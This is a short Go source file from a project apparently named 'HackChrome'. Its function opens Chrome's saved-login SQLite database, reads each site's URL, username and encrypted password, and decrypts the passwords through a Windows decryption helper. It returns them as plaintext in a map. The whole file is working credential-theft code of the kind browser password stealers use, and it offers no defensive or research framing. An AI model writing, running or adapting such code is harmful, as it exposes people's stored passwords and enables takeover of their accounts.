package core

import (
	"HackChrome/utils"
	"database/sql"
	"fmt"
)

func GetPwdPre(pwd_db string) map[string](map[string]string){
	result := make(map[string](map[string]string))
	db, err := sql.Open("sqlite3", pwd_db)
	if err != nil{
		fmt.Println(err)
	}
	defer db.Close()
	rows, _ := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	for rows.Next() {
		var url string
		var username string
		var pwd []byte
		err = rows.Scan(&url, &username, &pwd)
		pwd, err = utils.WinDecypt(pwd)
		if err != nil{
			continue
		}
		if len(url)>0 {
			result[url] = map[string]string{"username": username, "password": string(pwd)}
		}
	}

	return result
}
